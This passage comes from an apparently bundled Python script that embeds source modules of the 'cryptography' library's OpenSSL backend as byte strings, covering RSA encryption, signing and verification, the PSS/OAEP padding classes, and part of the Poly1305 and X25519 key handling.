self._backend._ffi.gc(\r\n            ctx, self._backend._lib.EVP_MD_CTX_free\r\n        )\r\n        res = self._backend._lib.EVP_DigestSignInit(\r\n            self._ctx,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._evp_pkey,\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n\r\n    def update(self, data: bytes) -> None:\r\n        data_ptr = self._backend._ffi.from_buffer(data)\r\n        res = self._backend._lib.EVP_DigestSignUpdate(\r\n            self._ctx, data_ptr, len(data)\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n\r\n    def finalize(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char[]", _POLY1305_TAG_SIZE)\r\n        outlen = self._backend._ffi.new("size_t *", _POLY1305_TAG_SIZE)\r\n        res = self._backend._lib.EVP_DigestSignFinal(self._ctx, buf, outlen)\r\n        self._backend.openssl_assert(res != 0)\r\n        self._backend.openssl_assert(outlen[0] == _POLY1305_TAG_SIZE)\r\n        return self._backend._ffi.buffer(buf)[: outlen[0]]\r\n\r\n    def verify(self, tag: bytes) -> None:\r\n        mac = self.finalize()\r\n        if not constant_time.bytes_eq(mac, tag):\r\n            raise InvalidSignature("Value did not match computed tag.")\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/rsa.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import (\r\n    InvalidSignature,\r\n    UnsupportedAlgorithm,\r\n    _Reasons,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.utils import (\r\n    _calculate_digest_and_algorithm,\r\n)\r\nfrom cryptography.hazmat.primitives import hashes, serialization\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    utils as asym_utils,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric.padding import (\r\n    AsymmetricPadding,\r\n    MGF1,\r\n    OAEP,\r\n    PKCS1v15,\r\n    PSS,\r\n    _Auto,\r\n    _DigestLength,\r\n    _MaxLength,\r\n    calculate_max_pss_salt_length,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric.rsa import (\r\n    RSAPrivateKey,\r\n    RSAPrivateNumbers,\r\n    RSAPublicKey,\r\n    RSAPublicNumbers,\r\n)\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\ndef _get_rsa_pss_salt_length(\r\n    backend: "Backend",\r\n    pss: PSS,\r\n    key: typing.Union[RSAPrivateKey, RSAPublicKey],\r\n    hash_algorithm: hashes.HashAlgorithm,\r\n) -> int:\r\n    salt = pss._salt_length\r\n\r\n    if isinstance(salt, _MaxLength):\r\n        return calculate_max_pss_salt_length(key, hash_algorithm)\r\n    elif isinstance(salt, _DigestLength):\r\n        return hash_algorithm.digest_size\r\n    elif isinstance(salt, _Auto):\r\n        if isinstance(key, RSAPrivateKey):\r\n            raise ValueError(\r\n                "PSS salt length can only be set to AUTO when verifying"\r\n            )\r\n        return backend._lib.RSA_PSS_SALTLEN_AUTO\r\n    else:\r\n        return salt\r\n\r\n\r\ndef _enc_dec_rsa(\r\n    backend: "Backend",\r\n    key: typing.Union["_RSAPrivateKey", "_RSAPublicKey"],\r\n    data: bytes,\r\n    padding: AsymmetricPadding,\r\n) -> bytes:\r\n    if not isinstance(padding, AsymmetricPadding):\r\n        raise TypeError("Padding must be an instance of AsymmetricPadding.")\r\n\r\n    if isinstance(padding, PKCS1v15):\r\n        padding_enum = backend._lib.RSA_PKCS1_PADDING\r\n    elif isinstance(padding, OAEP):\r\n        padding_enum = backend._lib.RSA_PKCS1_OAEP_PADDING\r\n\r\n        if not isinstance(padding._mgf, MGF1):\r\n            raise UnsupportedAlgorithm(\r\n                "Only MGF1 is supported by this backend.",\r\n                _Reasons.UNSUPPORTED_MGF,\r\n            )\r\n\r\n        if not backend.rsa_padding_supported(padding):\r\n            raise UnsupportedAlgorithm(\r\n                "This combination of padding and hash algorithm is not "\r\n                "supported by this backend.",\r\n                _Reasons.UNSUPPORTED_PADDING,\r\n            )\r\n\r\n    else:\r\n        raise UnsupportedAlgorithm(\r\n            "{} is not supported by this backend.".format(padding.name),\r\n            _Reasons.UNSUPPORTED_PADDING,\r\n        )\r\n\r\n    return _enc_dec_rsa_pkey_ctx(backend, key, data, padding_enum, padding)\r\n\r\n\r\ndef _enc_dec_rsa_pkey_ctx(\r\n    backend: "Backend",\r\n    key: typing.Union["_RSAPrivateKey", "_RSAPublicKey"],\r\n    data: bytes,\r\n    padding_enum: int,\r\n    padding: AsymmetricPadding,\r\n) -> bytes:\r\n    init: typing.Callable[[typing.Any], int]\r\n    crypt: typing.Callable[[typing.Any, typing.Any, int, bytes, int], int]\r\n    if isinstance(key, _RSAPublicKey):\r\n        init = backend._lib.EVP_PKEY_encrypt_init\r\n        crypt = backend._lib.EVP_PKEY_encrypt\r\n    else:\r\n        init = backend._lib.EVP_PKEY_decrypt_init\r\n        crypt = backend._lib.EVP_PKEY_decrypt\r\n\r\n    pkey_ctx = backend._lib.EVP_PKEY_CTX_new(key._evp_pkey, backend._ffi.NULL)\r\n    backend.openssl_assert(pkey_ctx != backend._ffi.NULL)\r\n    pkey_ctx = backend._ffi.gc(pkey_ctx, backend._lib.EVP_PKEY_CTX_free)\r\n    res = init(pkey_ctx)\r\n    backend.openssl_assert(res == 1)\r\n    res = backend._lib.EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, padding_enum)\r\n    backend.openssl_assert(res > 0)\r\n    buf_size = backend._lib.EVP_PKEY_size(key._evp_pkey)\r\n    backend.openssl_assert(buf_size > 0)\r\n    if isinstance(padding, OAEP):\r\n        mgf1_md = backend._evp_md_non_null_from_algorithm(\r\n            padding._mgf._algorithm\r\n        )\r\n        res = backend._lib.EVP_PKEY_CTX_set_rsa_mgf1_md(pkey_ctx, mgf1_md)\r\n        backend.openssl_assert(res > 0)\r\n        oaep_md = backend._evp_md_non_null_from_algorithm(padding._algorithm)\r\n        res = backend._lib.EVP_PKEY_CTX_set_rsa_oaep_md(pkey_ctx, oaep_md)\r\n        backend.openssl_assert(res > 0)\r\n\r\n    if (\r\n        isinstance(padding, OAEP)\r\n        and padding._label is not None\r\n        and len(padding._label) > 0\r\n    ):\r\n        # set0_rsa_oaep_label takes ownership of the char * so we need to\r\n        # copy it into some new memory\r\n        labelptr = backend._lib.OPENSSL_malloc(len(padding._label))\r\n        backend.openssl_assert(labelptr != backend._ffi.NULL)\r\n        backend._ffi.memmove(labelptr, padding._label, len(padding._label))\r\n        res = backend._lib.EVP_PKEY_CTX_set0_rsa_oaep_label(\r\n            pkey_ctx, labelptr, len(padding._label)\r\n        )\r\n        backend.openssl_assert(res == 1)\r\n\r\n    outlen = backend._ffi.new("size_t *", buf_size)\r\n    buf = backend._ffi.new("unsigned char[]", buf_size)\r\n    # Everything from this line onwards is written with the goal of being as\r\n    # constant-time as is practical given the constraints of Python and our\r\n    # API. See Bleichenbacher\'s \'98 attack on RSA, and its many many variants.\r\n    # As such, you should not attempt to change this (particularly to "clean it\r\n    # up") without understanding why it was written this way (see\r\n    # Chesterton\'s Fence), and without measuring to verify you have not\r\n    # introduced observable time differences.\r\n    res = crypt(pkey_ctx, buf, outlen, data, len(data))\r\n    resbuf = backend._ffi.buffer(buf)[: outlen[0]]\r\n    backend._lib.ERR_clear_error()\r\n    if res <= 0:\r\n        raise ValueError("Encryption/decryption failed.")\r\n    return resbuf\r\n\r\n\r\ndef _rsa_sig_determine_padding(\r\n    backend: "Backend",\r\n    key: typing.Union["_RSAPrivateKey", "_RSAPublicKey"],\r\n    padding: AsymmetricPadding,\r\n    algorithm: typing.Optional[hashes.HashAlgorithm],\r\n) -> int:\r\n    if not isinstance(padding, AsymmetricPadding):\r\n        raise TypeError("Expected provider of AsymmetricPadding.")\r\n\r\n    pkey_size = backend._lib.EVP_PKEY_size(key._evp_pkey)\r\n    backend.openssl_assert(pkey_size > 0)\r\n\r\n    if isinstance(padding, PKCS1v15):\r\n        # Hash algorithm is ignored for PKCS1v15-padding, may be None.\r\n        padding_enum = backend._lib.RSA_PKCS1_PADDING\r\n    elif isinstance(padding, PSS):\r\n        if not isinstance(padding._mgf, MGF1):\r\n            raise UnsupportedAlgorithm(\r\n                "Only MGF1 is supported by this backend.",\r\n                _Reasons.UNSUPPORTED_MGF,\r\n            )\r\n\r\n        # PSS padding requires a hash algorithm\r\n        if not isinstance(algorithm, hashes.HashAlgorithm):\r\n            raise TypeError("Expected instance of hashes.HashAlgorithm.")\r\n\r\n        # Size of key in bytes - 2 is the maximum\r\n        # PSS signature length (salt length is checked later)\r\n        if pkey_size - algorithm.digest_size - 2 < 0:\r\n            raise ValueError(\r\n                "Digest too large for key size. Use a larger "\r\n                "key or different digest."\r\n            )\r\n\r\n        padding_enum = backend._lib.RSA_PKCS1_PSS_PADDING\r\n    else:\r\n        raise UnsupportedAlgorithm(\r\n            "{} is not supported by this backend.".format(padding.name),\r\n            _Reasons.UNSUPPORTED_PADDING,\r\n        )\r\n\r\n    return padding_enum\r\n\r\n\r\n# Hash algorithm can be absent (None) to initialize the context without setting\r\n# any message digest algorithm. This is currently only valid for the PKCS1v15\r\n# padding type, where it means that the signature data is encoded/decoded\r\n# as provided, without being wrapped in a DigestInfo structure.\r\ndef _rsa_sig_setup(\r\n    backend: "Backend",\r\n    padding: AsymmetricPadding,\r\n    algorithm: typing.Optional[hashes.HashAlgorithm],\r\n    key: typing.Union["_RSAPublicKey", "_RSAPrivateKey"],\r\n    init_func: typing.Callable[[typing.Any], int],\r\n):\r\n    padding_enum = _rsa_sig_determine_padding(backend, key, padding, algorithm)\r\n    pkey_ctx = backend._lib.EVP_PKEY_CTX_new(key._evp_pkey, backend._ffi.NULL)\r\n    backend.openssl_assert(pkey_ctx != backend._ffi.NULL)\r\n    pkey_ctx = backend._ffi.gc(pkey_ctx, backend._lib.EVP_PKEY_CTX_free)\r\n    res = init_func(pkey_ctx)\r\n    if res != 1:\r\n        errors = backend._consume_errors()\r\n        raise ValueError("Unable to sign/verify with this key", errors)\r\n\r\n    if algorithm is not None:\r\n        evp_md = backend._evp_md_non_null_from_algorithm(algorithm)\r\n        res = backend._lib.EVP_PKEY_CTX_set_signature_md(pkey_ctx, evp_md)\r\n        if res <= 0:\r\n            backend._consume_errors()\r\n            raise UnsupportedAlgorithm(\r\n                "{} is not supported by this backend for RSA signing.".format(\r\n                    algorithm.name\r\n                ),\r\n                _Reasons.UNSUPPORTED_HASH,\r\n            )\r\n    res = backend._lib.EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, padding_enum)\r\n    if res <= 0:\r\n        backend._consume_errors()\r\n        raise UnsupportedAlgorithm(\r\n            "{} is not supported for the RSA signature operation.".format(\r\n                padding.name\r\n            ),\r\n            _Reasons.UNSUPPORTED_PADDING,\r\n        )\r\n    if isinstance(padding, PSS):\r\n        assert isinstance(algorithm, hashes.HashAlgorithm)\r\n        res = backend._lib.EVP_PKEY_CTX_set_rsa_pss_saltlen(\r\n            pkey_ctx,\r\n            _get_rsa_pss_salt_length(backend, padding, key, algorithm),\r\n        )\r\n        backend.openssl_assert(res > 0)\r\n\r\n        mgf1_md = backend._evp_md_non_null_from_algorithm(\r\n            padding._mgf._algorithm\r\n        )\r\n        res = backend._lib.EVP_PKEY_CTX_set_rsa_mgf1_md(pkey_ctx, mgf1_md)\r\n        backend.openssl_assert(res > 0)\r\n\r\n    return pkey_ctx\r\n\r\n\r\ndef _rsa_sig_sign(\r\n    backend: "Backend",\r\n    padding: AsymmetricPadding,\r\n    algorithm: hashes.HashAlgorithm,\r\n    private_key: "_RSAPrivateKey",\r\n    data: bytes,\r\n) -> bytes:\r\n    pkey_ctx = _rsa_sig_setup(\r\n        backend,\r\n        padding,\r\n        algorithm,\r\n        private_key,\r\n        backend._lib.EVP_PKEY_sign_init,\r\n    )\r\n    buflen = backend._ffi.new("size_t *")\r\n    res = backend._lib.EVP_PKEY_sign(\r\n        pkey_ctx, backend._ffi.NULL, buflen, data, len(data)\r\n    )\r\n    backend.openssl_assert(res == 1)\r\n    buf = backend._ffi.new("unsigned char[]", buflen[0])\r\n    res = backend._lib.EVP_PKEY_sign(pkey_ctx, buf, buflen, data, len(data))\r\n    if res != 1:\r\n        errors = backend._consume_errors_with_text()\r\n        raise ValueError(\r\n            "Digest or salt length too long for key size. Use a larger key "\r\n            "or shorter salt length if you are specifying a PSS salt",\r\n            errors,\r\n        )\r\n\r\n    return backend._ffi.buffer(buf)[:]\r\n\r\n\r\ndef _rsa_sig_verify(\r\n    backend: "Backend",\r\n    padding: AsymmetricPadding,\r\n    algorithm: hashes.HashAlgorithm,\r\n    public_key: "_RSAPublicKey",\r\n    signature: bytes,\r\n    data: bytes,\r\n) -> None:\r\n    pkey_ctx = _rsa_sig_setup(\r\n        backend,\r\n        padding,\r\n        algorithm,\r\n        public_key,\r\n        backend._lib.EVP_PKEY_verify_init,\r\n    )\r\n    res = backend._lib.EVP_PKEY_verify(\r\n        pkey_ctx, signature, len(signature), data, len(data)\r\n    )\r\n    # The previous call can return negative numbers in the event of an\r\n    # error. This is not a signature failure but we need to fail if it\r\n    # occurs.\r\n    backend.openssl_assert(res >= 0)\r\n    if res == 0:\r\n        backend._consume_errors()\r\n        raise InvalidSignature\r\n\r\n\r\ndef _rsa_sig_recover(\r\n    backend: "Backend",\r\n    padding: AsymmetricPadding,\r\n    algorithm: typing.Optional[hashes.HashAlgorithm],\r\n    public_key: "_RSAPublicKey",\r\n    signature: bytes,\r\n) -> bytes:\r\n    pkey_ctx = _rsa_sig_setup(\r\n        backend,\r\n        padding,\r\n        algorithm,\r\n        public_key,\r\n        backend._lib.EVP_PKEY_verify_recover_init,\r\n    )\r\n\r\n    # Attempt to keep the rest of the code in this function as constant/time\r\n    # as possible. See the comment in _enc_dec_rsa_pkey_ctx. Note that the\r\n    # buflen parameter is used even though its value may be undefined in the\r\n    # error case. Due to the tolerant nature of Python slicing this does not\r\n    # trigger any exceptions.\r\n    maxlen = backend._lib.EVP_PKEY_size(public_key._evp_pkey)\r\n    backend.openssl_assert(maxlen > 0)\r\n    buf = backend._ffi.new("unsigned char[]", maxlen)\r\n    buflen = backend._ffi.new("size_t *", maxlen)\r\n    res = backend._lib.EVP_PKEY_verify_recover(\r\n        pkey_ctx, buf, buflen, signature, len(signature)\r\n    )\r\n    resbuf = backend._ffi.buffer(buf)[: buflen[0]]\r\n    backend._lib.ERR_clear_error()\r\n    # Assume that all parameter errors are handled during the setup phase and\r\n    # any error here is due to invalid signature.\r\n    if res != 1:\r\n        raise InvalidSignature\r\n    return resbuf\r\n\r\n\r\nclass _RSAPrivateKey(RSAPrivateKey):\r\n    _evp_pkey: object\r\n    _rsa_cdata: object\r\n    _key_size: int\r\n\r\n    def __init__(\r\n        self, backend: "Backend", rsa_cdata, evp_pkey, _skip_check_key: bool\r\n    ):\r\n        res: int\r\n        # RSA_check_key is slower in OpenSSL 3.0.0 due to improved\r\n        # primality checking. In normal use this is unlikely to be a problem\r\n        # since users don\'t load new keys constantly, but for TESTING we\'ve\r\n        # added an init arg that allows skipping the checks. You should not\r\n        # use this in production code unless you understand the consequences.\r\n        if not _skip_check_key:\r\n            res = backend._lib.RSA_check_key(rsa_cdata)\r\n            if res != 1:\r\n                errors = backend._consume_errors_with_text()\r\n                raise ValueError("Invalid private key", errors)\r\n            # 2 is prime and passes an RSA key check, so we also check\r\n            # if p and q are odd just to be safe.\r\n            p = backend._ffi.new("BIGNUM **")\r\n            q = backend._ffi.new("BIGNUM **")\r\n            backend._lib.RSA_get0_factors(rsa_cdata, p, q)\r\n            backend.openssl_assert(p[0] != backend._ffi.NULL)\r\n            backend.openssl_assert(q[0] != backend._ffi.NULL)\r\n            p_odd = backend._lib.BN_is_odd(p[0])\r\n            q_odd = backend._lib.BN_is_odd(q[0])\r\n            if p_odd != 1 or q_odd != 1:\r\n                errors = backend._consume_errors_with_text()\r\n                raise ValueError("Invalid private key", errors)\r\n\r\n        # Blinding is on by default in many versions of OpenSSL, but let\'s\r\n        # just be conservative here.\r\n        res = backend._lib.RSA_blinding_on(rsa_cdata, backend._ffi.NULL)\r\n        backend.openssl_assert(res == 1)\r\n\r\n        self._backend = backend\r\n        self._rsa_cdata = rsa_cdata\r\n        self._evp_pkey = evp_pkey\r\n\r\n        n = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.RSA_get0_key(\r\n            self._rsa_cdata,\r\n            n,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n        )\r\n        self._backend.openssl_assert(n[0] != self._backend._ffi.NULL)\r\n        self._key_size = self._backend._lib.BN_num_bits(n[0])\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self._key_size\r\n\r\n    def decrypt(self, ciphertext: bytes, padding: AsymmetricPadding) -> bytes:\r\n        key_size_bytes = (self.key_size + 7) // 8\r\n        if key_size_bytes != len(ciphertext):\r\n            raise ValueError("Ciphertext length must be equal to key size.")\r\n\r\n        return _enc_dec_rsa(self._backend, self, ciphertext, padding)\r\n\r\n    def public_key(self) -> RSAPublicKey:\r\n        ctx = self._backend._lib.RSAPublicKey_dup(self._rsa_cdata)\r\n        self._backend.openssl_assert(ctx != self._backend._ffi.NULL)\r\n        ctx = self._backend._ffi.gc(ctx, self._backend._lib.RSA_free)\r\n        evp_pkey = self._backend._rsa_cdata_to_evp_pkey(ctx)\r\n        return _RSAPublicKey(self._backend, ctx, evp_pkey)\r\n\r\n    def private_numbers(self) -> RSAPrivateNumbers:\r\n        n = self._backend._ffi.new("BIGNUM **")\r\n        e = self._backend._ffi.new("BIGNUM **")\r\n        d = self._backend._ffi.new("BIGNUM **")\r\n        p = self._backend._ffi.new("BIGNUM **")\r\n        q = self._backend._ffi.new("BIGNUM **")\r\n        dmp1 = self._backend._ffi.new("BIGNUM **")\r\n        dmq1 = self._backend._ffi.new("BIGNUM **")\r\n        iqmp = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.RSA_get0_key(self._rsa_cdata, n, e, d)\r\n        self._backend.openssl_assert(n[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(e[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(d[0] != self._backend._ffi.NULL)\r\n        self._backend._lib.RSA_get0_factors(self._rsa_cdata, p, q)\r\n        self._backend.openssl_assert(p[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(q[0] != self._backend._ffi.NULL)\r\n        self._backend._lib.RSA_get0_crt_params(\r\n            self._rsa_cdata, dmp1, dmq1, iqmp\r\n        )\r\n        self._backend.openssl_assert(dmp1[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(dmq1[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(iqmp[0] != self._backend._ffi.NULL)\r\n        return RSAPrivateNumbers(\r\n            p=self._backend._bn_to_int(p[0]),\r\n            q=self._backend._bn_to_int(q[0]),\r\n            d=self._backend._bn_to_int(d[0]),\r\n            dmp1=self._backend._bn_to_int(dmp1[0]),\r\n            dmq1=self._backend._bn_to_int(dmq1[0]),\r\n            iqmp=self._backend._bn_to_int(iqmp[0]),\r\n            public_numbers=RSAPublicNumbers(\r\n                e=self._backend._bn_to_int(e[0]),\r\n                n=self._backend._bn_to_int(n[0]),\r\n            ),\r\n        )\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        return self._backend._private_key_bytes(\r\n            encoding,\r\n            format,\r\n            encryption_algorithm,\r\n            self,\r\n            self._evp_pkey,\r\n            self._rsa_cdata,\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        data: bytes,\r\n        padding: AsymmetricPadding,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> bytes:\r\n        data, algorithm = _calculate_digest_and_algorithm(data, algorithm)\r\n        return _rsa_sig_sign(self._backend, padding, algorithm, self, data)\r\n\r\n\r\nclass _RSAPublicKey(RSAPublicKey):\r\n    _evp_pkey: object\r\n    _rsa_cdata: object\r\n    _key_size: int\r\n\r\n    def __init__(self, backend: "Backend", rsa_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._rsa_cdata = rsa_cdata\r\n        self._evp_pkey = evp_pkey\r\n\r\n        n = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.RSA_get0_key(\r\n            self._rsa_cdata,\r\n            n,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n        )\r\n        self._backend.openssl_assert(n[0] != self._backend._ffi.NULL)\r\n        self._key_size = self._backend._lib.BN_num_bits(n[0])\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self._key_size\r\n\r\n    def encrypt(self, plaintext: bytes, padding: AsymmetricPadding) -> bytes:\r\n        return _enc_dec_rsa(self._backend, self, plaintext, padding)\r\n\r\n    def public_numbers(self) -> RSAPublicNumbers:\r\n        n = self._backend._ffi.new("BIGNUM **")\r\n        e = self._backend._ffi.new("BIGNUM **")\r\n        self._backend._lib.RSA_get0_key(\r\n            self._rsa_cdata, n, e, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(n[0] != self._backend._ffi.NULL)\r\n        self._backend.openssl_assert(e[0] != self._backend._ffi.NULL)\r\n        return RSAPublicNumbers(\r\n            e=self._backend._bn_to_int(e[0]),\r\n            n=self._backend._bn_to_int(n[0]),\r\n        )\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, self._rsa_cdata\r\n        )\r\n\r\n    def verify(\r\n        self,\r\n        signature: bytes,\r\n        data: bytes,\r\n        padding: AsymmetricPadding,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> None:\r\n        data, algorithm = _calculate_digest_and_algorithm(data, algorithm)\r\n        _rsa_sig_verify(\r\n            self._backend, padding, algorithm, self, signature, data\r\n        )\r\n\r\n    def recover_data_from_signature(\r\n        self,\r\n        signature: bytes,\r\n        padding: AsymmetricPadding,\r\n        algorithm: typing.Optional[hashes.HashAlgorithm],\r\n    ) -> bytes:\r\n        if isinstance(algorithm, asym_utils.Prehashed):\r\n            raise TypeError(\r\n                "Prehashed is only supported in the sign and verify methods. "\r\n                "It cannot be used with recover_data_from_signature."\r\n            )\r\n        return _rsa_sig_recover(\r\n            self._backend, padding, algorithm, self, signature\r\n        )\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/padding.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives._asymmetric import (\r\n    AsymmetricPadding as AsymmetricPadding,\r\n)\r\nfrom cryptography.hazmat.primitives.asymmetric import rsa\r\n\r\n\r\nclass PKCS1v15(AsymmetricPadding):\r\n    name = "EMSA-PKCS1-v1_5"\r\n\r\n\r\nclass _MaxLength:\r\n    "Sentinel value for `MAX_LENGTH`."\r\n\r\n\r\nclass _Auto:\r\n    "Sentinel value for `AUTO`."\r\n\r\n\r\nclass _DigestLength:\r\n    "Sentinel value for `DIGEST_LENGTH`."\r\n\r\n\r\nclass PSS(AsymmetricPadding):\r\n    MAX_LENGTH = _MaxLength()\r\n    AUTO = _Auto()\r\n    DIGEST_LENGTH = _DigestLength()\r\n    name = "EMSA-PSS"\r\n    _salt_length: typing.Union[int, _MaxLength, _Auto, _DigestLength]\r\n\r\n    def __init__(\r\n        self,\r\n        mgf: "MGF",\r\n        salt_length: typing.Union[int, _MaxLength, _Auto, _DigestLength],\r\n    ) -> None:\r\n        self._mgf = mgf\r\n\r\n        if not isinstance(\r\n            salt_length, (int, _MaxLength, _Auto, _DigestLength)\r\n        ):\r\n            raise TypeError(\r\n                "salt_length must be an integer, MAX_LENGTH, "\r\n                "DIGEST_LENGTH, or AUTO"\r\n            )\r\n\r\n        if isinstance(salt_length, int) and salt_length < 0:\r\n            raise ValueError("salt_length must be zero or greater.")\r\n\r\n        self._salt_length = salt_length\r\n\r\n\r\nclass OAEP(AsymmetricPadding):\r\n    name = "EME-OAEP"\r\n\r\n    def __init__(\r\n        self,\r\n        mgf: "MGF",\r\n        algorithm: hashes.HashAlgorithm,\r\n        label: typing.Optional[bytes],\r\n    ):\r\n        if not isinstance(algorithm, hashes.HashAlgorithm):\r\n            raise TypeError("Expected instance of hashes.HashAlgorithm.")\r\n\r\n        self._mgf = mgf\r\n        self._algorithm = algorithm\r\n        self._label = label\r\n\r\n\r\nclass MGF(metaclass=abc.ABCMeta):\r\n    _algorithm: hashes.HashAlgorithm\r\n\r\n\r\nclass MGF1(MGF):\r\n    MAX_LENGTH = _MaxLength()\r\n\r\n    def __init__(self, algorithm: hashes.HashAlgorithm):\r\n        if not isinstance(algorithm, hashes.HashAlgorithm):\r\n            raise TypeError("Expected instance of hashes.HashAlgorithm.")\r\n\r\n        self._algorithm = algorithm\r\n\r\n\r\ndef calculate_max_pss_salt_length(\r\n    key: typing.Union["rsa.RSAPrivateKey", "rsa.RSAPublicKey"],\r\n    hash_algorithm: hashes.HashAlgorithm,\r\n) -> int:\r\n    if not isinstance(key, (rsa.RSAPrivateKey, rsa.RSAPublicKey)):\r\n        raise TypeError("key must be an RSA public or private key")\r\n    # bit length - 1 per RFC 3447\r\n    emlen = (key.key_size + 6) // 8\r\n    salt_length = emlen - hash_algorithm.digest_size - 2\r\n    assert salt_length >= 0\r\n    return salt_length\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/x25519.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.hazmat.backends.openssl.utils import _evp_pkey_derive\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric.x25519 import (\r\n    X25519PrivateKey,\r\n    X25519PublicKey,\r\n)\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\n_X25519_KEY_SIZE = 32\r\n\r\n\r\nclass _X25519PublicKey(X25519PublicKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                encoding is not serialization.Encoding.Raw\r\n                or format is not serialization.PublicFormat.Raw\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw"\r\n                )\r\n\r\n            return self._raw_public_bytes()\r\n\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_public_bytes(self) -> bytes:\r\n        ucharpp = self._backend._ffi.new("unsigned char **")\r\n        res = self._backend._lib.EVP_PKEY_get1_tls_encodedpoint(\r\n            self._evp_pkey, ucharpp\r\n        )\r\n        self._backend.openssl_assert(res == 32)\r\n        self._backend.openssl_assert(ucharpp[0] != self._backend._ffi.NULL)\r\n        data = self._backend._ffi.gc(\r\n            ucharpp[0], self._backend._lib.OPENSSL_free\r\n        )\r\n        return self._backend._ffi.buffer(data, res)[:]\r\n\r\n\r\nclass _X25519PrivateKey(X25519PrivateKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_key(self) -> X25519PublicKey:\r\n        bio = self._backend._create_mem_bio_gc()\r\n        res = self._backend._lib.i2d_PUBKEY_bio(bio, self._evp_pkey)\r\n        self._backend.openssl_assert(res == 1)\r\n        evp_pkey = self._backend._lib.d2i_PUBKEY_bio(\r\n            bio, self._backend._ffi.NULL\r\n        )\r\n        self._backend.openssl_assert(evp_pkey != self._backend._ffi.NULL)\r\n        evp_pkey = self._backend._ffi.gc(\r\n            evp_pkey, self._backend._lib.EVP_PKEY_free\r\n        )\r\n        return _X25519PublicKey(self._backend, evp_pkey)\r\n\r\n    def exchange(self, peer_public_key: X25519PublicKey) -> bytes:\r\n        if not isinstance(peer_public_key, X25519PublicKey):\r\n            raise TypeError("peer_public_key must be X25519PublicKey.")\r\n\r\n        return _evp_pkey_derive(self._backend, self._evp_pkey, peer_public_key)\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                format is not serialization.PrivateFormat.Raw\r\n                or encoding is not serialization.Encoding.Raw\r\n                or not isinstance(\r\n                    encryption_algorithm, serialization.NoEncryption\r\n                )\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw "\r\n                    "and encryption_algorithm must be NoEncryption()"\r\n                )\r\n\r\n            return self._raw_private_bytes()\r\n\r\n        return self._backend._private_key_bytes(\r\n            